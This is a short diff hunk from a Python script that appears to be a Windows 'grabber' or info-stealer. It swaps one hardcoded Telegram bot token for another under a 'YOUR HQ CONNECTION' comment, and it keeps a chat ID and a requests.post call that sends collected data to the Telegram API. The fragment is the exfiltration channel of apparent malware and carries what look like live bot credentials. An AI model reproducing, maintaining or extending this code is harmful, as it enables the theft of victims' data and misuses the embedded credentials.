@@ -22,7 +22,7 @@ def grab_windows():
     }
 
     # --- YOUR HQ CONNECTION ---
-    bot_token = "8726414002:AAGBuEnlurmGP0cVjk5OF1th2DN24QSxLic"
+    bot_token = "8726414002:AAHHiEdDn-98Ehb-Grc_Lt6ENHIpqPslemM"
     chat_id = "7929123246"
     
     requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", 
